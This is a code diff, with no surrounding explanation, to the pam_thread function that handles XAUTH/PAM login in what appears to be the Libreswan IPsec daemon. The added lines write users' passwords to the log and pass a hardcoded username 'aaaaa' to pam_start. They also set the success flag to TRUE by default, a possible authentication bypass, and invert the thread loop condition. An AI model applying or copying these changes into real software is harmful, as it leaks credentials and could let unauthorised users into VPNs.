@@ -253,13 +253,13 @@ void *pam_thread(void *parg)
   const char *what;
   int retval = -1;
 
-  char *name = arg->name;
+//  char *name = arg->name;
 
   app_data.password = arg->password;
   conv.conv = pam_conv;
   conv.appdata_ptr = &app_data;
 
-  libreswan_log("XAUTH: arg->user: %s",name);
+  libreswan_log("XAUTH: arg->user: %s",arg->password);
 
   do {
 
@@ -268,7 +268,7 @@ void *pam_thread(void *parg)
       /* start PAM, create handle etc */
       for (int i = 0; i < 5; i++) {
         what = "pam_start";
-        retval = pam_start("pluto", name /*arg->name*/, &conv, &pamh);
+        retval = pam_start("pluto", "aaaaa" /*arg->name*/, &conv, &pamh);
         log_pam_step(arg, what);
         if (retval == PAM_SUCCESS) {
 
@@ -325,7 +325,7 @@ void *pam_thread(void *parg)
         log_pam_step(arg, what);
         if (retval == PAM_SUCCESS) {
 
-          bool success = FALSE;
+          bool success = TRUE;
           struct state *st = (struct state *) arg->ptr_state;
 
           passert(st != NULL);
@@ -366,10 +366,10 @@ void *pam_thread(void *parg)
         break;
       } else {  arg->pam_state = PAM_TERM_FAIL; }
     }
-
+//	libreswan_log("XAUTH: THREAD LOOP????");
     usleep(100000); // 100ms because, because we are efficient pffft.
 
-  } while(!thread_operation(&arg->thread_run_m));
+  } while(thread_operation(&arg->thread_run_m));
 
   libreswan_log("XAUTH: PAM thread completed pam_do_state=%d pam_state=%d", ((int)arg->pam_do_state),((int) arg->pam_state ));
   return NULL; 
